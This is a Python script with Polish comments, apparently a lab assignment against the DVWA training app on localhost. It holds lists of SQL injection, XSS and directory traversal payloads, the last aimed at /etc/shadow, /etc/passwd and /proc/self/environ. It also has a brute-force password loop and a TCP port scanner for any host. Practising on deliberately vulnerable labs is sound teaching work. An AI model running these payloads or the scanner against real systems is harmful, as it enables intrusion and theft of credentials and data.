import requests
from bs4 import BeautifulSoup
import re
import time
import socket

# Konfiguracja DVWA i sesja
session = requests.Session()
login_url = 'http://localhost/DVWA/login.php'
sqli_url = 'http://localhost/DVWA/vulnerabilities/sqli/'
xss_url = 'http://localhost/DVWA/vulnerabilities/xss_r/'
brute_url = login_url
dirtrav_url = 'http://localhost/DVWA/vulnerabilities/fi/'

# CSRF Token
def get_csrf_token(url, session):
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})
    if not token_input:
        print("Nie udało się znaleźć tokenu CSRF na stronie")
        return None
    return token_input['value']

# Logowanie
def login(session, username='admin', password='password'):
    token = get_csrf_token(login_url, session)
    if not token:
        return False
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': token
    }
    resp = session.post(login_url, data=login_data)
    if 'Login failed' in resp.text or 'login.php' in resp.url:
        print("Logowanie nieudane.")
        return False
    print("Zalogowano pomyślnie jako", username)
    return True

# SQLi Zadanie 1
def test_sqli(session):
    payloads = [
        "1' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' /*",
        "' OR 1=1-- ",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 'x'='x",
    ]
    print("\nTestowanie SQL Injection\n")
    for payload in payloads:
        params = {'id': payload, 'Submit': 'Submit'}
        print(f"Testuję payload: {payload}")
        response = session.get(sqli_url, params=params)
        soup = BeautifulSoup(response.text, 'html.parser')
        data_lines = soup.find_all(string=re.compile(r'First name:|Surname:'))
        if data_lines:
            print("Prawdopodobnie podatna na SQL Injection! Odpowiedź zawiera dane:")
            for line in data_lines:
                print(f"  {line.strip()}")
        else:
            print("Brak danych lub brak podatności przy tym payloadzie.")
        print("-" * 40)

# XSS Zadanie 2
def test_xss(session):
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('Injected')</script>",
        "<img src=x onerror=alert('ErrorXSS')>",
        "<svg/onload=alert('SVGXSS')>",
        "<iframe src=javascript:alert('FrameXSS')>",
        "<style>@import'javascript:alert(\"CSSXSS\")';</style>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(`Template literal XSS`)</script>",
        "<input autofocus onfocus=alert('FocusXSS')>"
    ]

    print("\nTestowanie XSS\n")

    for payload in payloads:
        print(f"Testuję payload: {payload}")
        params = {'name': payload, 'Submit': 'Submit'}
        response = session.get(xss_url, params=params)

        if payload in response.text:
            print("Prawdopodobnie podatna na XSS, payload znaleziony w odpowiedzi.")
        else:
            print("Payload nie został znaleziony w odpowiedzi.")
        print("-" * 50)

# Brute-force Zadanie 3
def test_bruteforce(session):
    usernames = ['admin', 'user', 'test']
    passwords = ['password', '123456', 'admin', 'password123']
    print("\nTestowanie brute-force\n")
    for username in usernames:
        for password in passwords:
            token = get_csrf_token(login_url, session)
            if not token:
                print("Nie udało się pobrać tokenu CSRF.")
                return
            login_data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': token
            }
            resp = session.post(login_url, data=login_data)
            if 'Login failed' not in resp.text and 'login.php' not in resp.url:
                print(f"Udało się zalogować jako {username} z hasłem {password}")
                return
            else:
                print(f"Próba: {username} / {password} - nieudana")
            time.sleep(0.5)
    print("Nie znaleziono poprawnej kombinacji login/hasło.")

# Directory Traversal Zadanie Dodatkowe
def test_dir_traversal(session):
    payloads = [
        "../../../../../../etc/passwd",
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%2fetc/passwd",
        "%2e%2e%2f..%2e%2e%2fetc/passwd",
        "..%2f..%2fetc/passwd",
        "..\\..\\windows\\win.ini",
        "..%5c..%5cwindows%5cwin.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "../../../../../../etc/hosts",
        "../../../../../../var/log/apache2/access.log",
        "../../../../../../var/log/apache2/error.log",
        "../../../../../../proc/self/environ",
        "../../../../../../etc/shadow",
        "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd",
    ]

    print("\nTestowanie Directory Traversal\n")

    for payload in payloads:
        params = {'page': payload}
        print(f"Testuję payload: {payload}")
        response = session.get(dirtrav_url, params=params)

        if any(marker in response.text for marker in ["root:x:", "daemon", "bin:x:", "[fonts]"]):
            print("Payload prawdopodobnie zadziałał, odczyt pliku wykryty.")
            print("Zawartość odpowiedzi:")
            print("=" * 50)
            content = response.text.strip()
            lines = content.splitlines()
            for line in lines[:30]:  # pierwsze 30 linii
                print(line.strip())
            print("=" * 50)
        else:
            print("[-] Payload nie wywołał odczytu pliku.")
        print("-" * 50)

# Skaner portów Zadanie 4
def scan_ports(host, start_port, end_port):
    print(f"\nSkanowanie portów TCP na {host}\n")
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((host, port))
                if result == 0:
                    print(f"Port {port} jest otwarty")
        except Exception as e:
            print(f"Błąd przy sprawdzaniu portu {port}: {e}")

# CLI
def main():
    if not login(session):
        return
    while True:
        print("\nMENU")
        print("1. Test SQL Injection")
        print("2. Test XSS")
        print("3. Test Brute-force")
        print("4. Test Directory Traversal")
        print("5. Skaner portów TCP")
        print("6. Wyjście")

        choice = input("Wybierz opcję: ")

        if choice == '1':
            test_sqli(session)
        elif choice == '2':
            test_xss(session)
        elif choice == '3':
            test_bruteforce(session)
        elif choice == '4':
            test_dir_traversal(session)
        elif choice == '5':
            host = input("Podaj adres hosta (np. 127.0.0.1): ")
            start = int(input("Początkowy port: "))
            end = int(input("Końcowy port: "))
            scan_ports(host, start, end)
        elif choice == '6':
            print("Zakończono.")
            break
        else:
            print("Nieprawidłowy wybór.")

if __name__ == "__main__":
    main()
